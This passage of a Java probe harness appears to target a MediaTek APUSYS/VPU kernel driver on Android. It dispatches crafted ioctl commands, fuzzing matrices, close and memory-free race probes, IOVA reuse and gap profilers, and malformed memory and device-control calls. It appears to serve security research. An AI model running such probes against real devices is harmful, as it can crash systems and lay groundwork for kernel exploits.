                runRunCmdVpuIovaHardwareBufferProbe(fd, false, false, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpSplitIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpSplitIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpAnnVersionIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION);
            }

            if (runCmdVpuXrpAnnVersionIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION);
            }

            if (runCmdVpuXrpAnnVersionWrapperZeroDataIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 10000, false, VPU_DESC_MINIMAL,
                    XRP_CMD_FLAGS_INITIAL, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ZERO_DATA);
            }

            if (runCmdVpuXrpAnnVersionWrapperZeroDataIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 10000, false, VPU_DESC_MINIMAL,
                    XRP_CMD_FLAGS_INITIAL, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ZERO_DATA);
            }

            if (runCmdVpuXrpAnnVersionWrapperZeroDataWaitIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 1000, false, VPU_DESC_MINIMAL,
                    XRP_CMD_FLAGS_INITIAL, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ZERO_DATA, true);
            }

            if (runCmdVpuXrpInternalAnnVersionIova) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_MINIMAL);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaControl) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_MINIMAL);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_LIBVPU);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescControl) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_LIBVPU);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlags) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsControl) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsSettings68Control) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperData) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                    XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                    XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                    XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_SYNC,
                    XrpSettingsShape.WRAPPER_ONE_DATA_OUTPUT44);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataOutput44Control) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                    XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_SYNC,
                    XrpSettingsShape.WRAPPER_ONE_DATA_OUTPUT44);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 20000, true,
                    VPU_DESC_LIBVPU_CODE5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataCode5Control) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 20000, true,
                    VPU_DESC_LIBVPU_CODE5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 20000, true,
                    VPU_DESC_LIBVPU_CODE5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, false,
                    VPU_REQUEST_FLAGS_DEFAULT, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 20000, true,
                    VPU_DESC_LIBVPU_CODE5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, false,
                    VPU_REQUEST_FLAGS_DEFAULT, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsWaitIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 1000, true,
                    VPU_DESC_LIBVPU_CODE5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, true,
                    VPU_REQUEST_FLAGS_DEFAULT, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsWordMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsWordMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsWordMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsWordMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsSizeMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsSizeMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsSizeMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsPriorityMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsPriorityMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsPriorityMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsBufferCountMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsPortMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsPortMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsPortMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsPortMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsFormatMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsFormatMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsFormatMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsPlaneCountMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsHeightMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsHeightMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsHeightMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsOperandIdMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsOpShapeMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixProbe(fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsOpcodeMatrixProbe(fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIova) {
                runRunCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixIovaControl) {
                runRunCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsWaitIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 1000, true,
                    VPU_DESC_LIBVPU_SETTINGS5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, true,
                    VPU_REQUEST_FLAGS_DEFAULT, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsWaitIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 1000, true,
                    VPU_DESC_LIBVPU_SETTINGS5, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN_WRAPPER,
                    XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, false,
                    VPU_REQUEST_FLAGS_DEFAULT, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOpcodeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOperandIdMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOperandOffsetMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOpShapeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeRangeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCodeSizeCleanMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsOutputShapeMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataDescMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataEntryMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataTargetMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDataPayloadMatrixProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsDescriptorPlaneFuzzProbe(
                    fd, false);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIova) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffProbe(
                    fd, true);
            }

            if (runCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffIovaControl) {
                runRunCmdVpuXrpTargetSettings5NoSettingsCmdCopybackDiffProbe(
                    fd, false);
            }

            if (runCmdVpuXrpCloseRaceIova) {
                runRunCmdVpuXrpCloseRaceHardwareBufferProbe();
            }

            if (runCmdVpuXrpCloseRaceDelayMatrixIova) {
                runRunCmdVpuXrpCloseRaceDelayMatrixProbe();
            }

            if (runCmdVpuXrpMemFreeRaceIova) {
                runRunCmdVpuXrpMemFreeRaceHardwareBufferProbe();
            }

            if (runCmdVpuXrpMemFreeRaceCompletedIova) {
                runRunCmdVpuXrpMemFreeRaceCompletedHardwareBufferProbe();
            }

            if (runCmdVpuXrpMemFreeRaceCompletedReuseIova) {
                runRunCmdVpuXrpMemFreeRaceCompletedReuseHardwareBufferProbe();
            }

            if (runCmdVpuXrpMemFreeRaceCompletedGapReuseIova) {
                runRunCmdVpuXrpMemFreeRaceCompletedGapReuseHardwareBufferProbe();
            }

            if (runCmdVpuXrpDevCtrlRaceIova) {
                runRunCmdVpuXrpDevCtrlRaceHardwareBufferProbe();
            }

            if (runCmdVpuXrpDevCtrlMatrixIova) {
                runRunCmdVpuXrpDevCtrlControlMatrixHardwareBufferProbe();
            }

            if (runCmdVpuXrpTwoCommandSharedIova) {
                runRunCmdVpuXrpTwoCommandSharedIovaProbe();
            }

            if (runCmdVpuXrpCompletedLatencyMatrixIova) {
                runRunCmdVpuXrpCompletedLatencyMatrixProbe();
            }

            if (runCmdVpuXrpCompletionPollIova) {
                runRunCmdVpuXrpCompletionPollProbe();
            }

            if (apusysIovaReuseProfiler) {
                runApusysIovaReuseProfiler();
            }

            if (apusysIovaGapProfiler) {
                runApusysIovaGapProfiler();
            }

            if (apusysIovaGapControlProfiler) {
                runApusysIovaGapControlProfiler();
            }

            if (apusysIovaGapPairSelectionProfiler) {
                runApusysIovaGapPairSelectionProfiler();
            }

            if (apusysIovaGapPressureProfiler) {
                runApusysIovaGapPressureProfiler();
            }

            if (apusysIovaGapSourceProfiler) {
                runApusysIovaGapSourceProfiler();
            }

            if (apusysIovaGapFreeNeighborhoodProfiler) {
                runApusysIovaGapFreeNeighborhoodProfiler();
            }

            if (apusysIovaGapLower2FocusProfiler) {
                runApusysIovaGapLower2FocusProfiler();
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlot) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                    XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, false,
                    VPU_REQUEST_FLAGS_PRELOAD_SLOT);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsWrapperDataPreloadSlotControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION, 20000, true, VPU_DESC_LIBVPU,
                    XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                    XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                    XrpSettingsShape.WRAPPER_ONE_DATA, false,
                    VPU_REQUEST_FLAGS_PRELOAD_SLOT);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrix) {
                runRunCmdVpuXrpFlagsMatrixHardwareBufferProbe(fd, true);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescFlagsMatrixControl) {
                runRunCmdVpuXrpFlagsMatrixHardwareBufferProbe(fd, false);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrix) {
                runRunCmdVpuXrpOperandOffsetMatrixHardwareBufferProbe(fd, true);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescOperandOffsetMatrixControl) {
                runRunCmdVpuXrpOperandOffsetMatrixHardwareBufferProbe(fd, false);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReady) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN,
                    XRP_OUTPUT_HEADER_FLAG_SYNC);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputReadyControl) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_CODE_OUTPUT, XRP_SETTINGS_LEN,
                    XRP_OUTPUT_HEADER_FLAG_SYNC);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirst) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_OUTPUT_CODE);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDescSendFlagsOutputFirstControl) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_LIBVPU, XRP_CMD_FLAGS_SEND,
                    VPU_DESC_ORDER_OUTPUT_CODE);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true,
                    VPU_DESC_LIBVPU_ALIAS5);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaLibvpuDesc5Control) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false,
                    VPU_DESC_LIBVPU_ALIAS5);
            }

            if (runCmdVpuXrpOpMatrixIova) {
                runRunCmdVpuXrpOpMatrixHardwareBufferProbe(fd, true);
            }

            if (runCmdVpuXrpOpMatrixIovaControl) {
                runRunCmdVpuXrpOpMatrixHardwareBufferProbe(fd, false);
            }

            if (runCmdVpuXrpOpCaseIova != null) {
                runRunCmdVpuXrpOpCaseHardwareBufferProbe(fd, true,
                    runCmdVpuXrpOpCaseIova);
            }

            if (runCmdVpuXrpOpCaseIovaControl != null) {
                runRunCmdVpuXrpOpCaseHardwareBufferProbe(fd, false,
                    runCmdVpuXrpOpCaseIovaControl);
            }

            if (ucmdKey != null) {
                runUcmdKeyHardwareBufferProbe(fd, ucmdKey);
            }

            if (ucmdKeyDump != null) {
                runUcmdKeyDumpHardwareBufferProbe(fd, ucmdKeyDump);
            }

            System.out.println("\n[+] Probe completed. Interpret results as handler reachability only.");
        } finally {
            if (fd >= 0) {
                DrmTrigger.closeFd(fd);
            }
        }
    }

    private static void runMemNegative(int fd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS memory negative tests ===");
        System.out.println("[*] Mode: NULL user pointer and bad fd/zero-size only; no valid dmabuf");

        ioctlAndPrint(fd, "mem_create2_null", APUSYS_CMD_MEM_CREATE2, 0);
        ioctlAndPrint(fd, "mem_create3_null", APUSYS_CMD_MEM_CREATE3, 0);

        long memA = DrmTrigger.sScratchBuf + OFF_MEM_A;
        DrmTrigger.zeroMem(memA, 0x38);
        long ret = ioctlAndPrint(fd, "mem_create2_zero", APUSYS_CMD_MEM_CREATE2, memA);
        cleanupMemSuccess(fd, "mem_create2", APUSYS_CMD_MEM_FREE_02, memA, ret);
        DrmTrigger.zeroMem(memA, 0x38);
        DrmTrigger.unsafePutInt(memA + 0x20, -1);
        ret = ioctlAndPrint(fd, "mem_create2_badfd", APUSYS_CMD_MEM_CREATE2, memA);
        cleanupMemSuccess(fd, "mem_create2", APUSYS_CMD_MEM_FREE_02, memA, ret);

        long memB = DrmTrigger.sScratchBuf + OFF_MEM_B;
        DrmTrigger.zeroMem(memB, 0x38);
        ret = ioctlAndPrint(fd, "mem_create3_zero", APUSYS_CMD_MEM_CREATE3, memB);
        cleanupMemSuccess(fd, "mem_create3", APUSYS_CMD_MEM_FREE_10, memB, ret);
        DrmTrigger.zeroMem(memB, 0x38);
        DrmTrigger.unsafePutInt(memB + 0x20, -1);
        ret = ioctlAndPrint(fd, "mem_create3_badfd", APUSYS_CMD_MEM_CREATE3, memB);
        cleanupMemSuccess(fd, "mem_create3", APUSYS_CMD_MEM_FREE_10, memB, ret);
    }

    private static void runDevCtrlProbe(int fd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS device-control tests ===");
        System.out.println("[*] Mode: ioctl 0x400c4109 with known provider ids,"
            + " core 0/1, control value 0");

        probeDevCtrl(fd, "mdla", 0x02, 0, 0);
        probeDevCtrl(fd, "mdla", 0x02, 1, 0);
        probeDevCtrl(fd, "vpu", 0x03, 0, 0);
        probeDevCtrl(fd, "vpu", 0x03, 1, 0);
        probeDevCtrl(fd, "edma", 0x04, 0, 0);
        probeDevCtrl(fd, "edma", 0x04, 1, 0);
        probeDevCtrl(fd, "mdla_rt", 0x22, 0, 0);
        probeDevCtrl(fd, "mdla_rt", 0x22, 1, 0);
        probeDevCtrl(fd, "vpu_rt", 0x23, 0, 0);
        probeDevCtrl(fd, "vpu_rt", 0x23, 1, 0);
    }

    private static long probeDevCtrl(int fd, String provider, int devId,
                                     int coreId, int control) throws Exception {
        long devCtrl = DrmTrigger.sScratchBuf + OFF_DEV_CTRL;
        DrmTrigger.zeroMem(devCtrl, 0x0c);
        DrmTrigger.unsafePutInt(devCtrl + 0x00, devId);
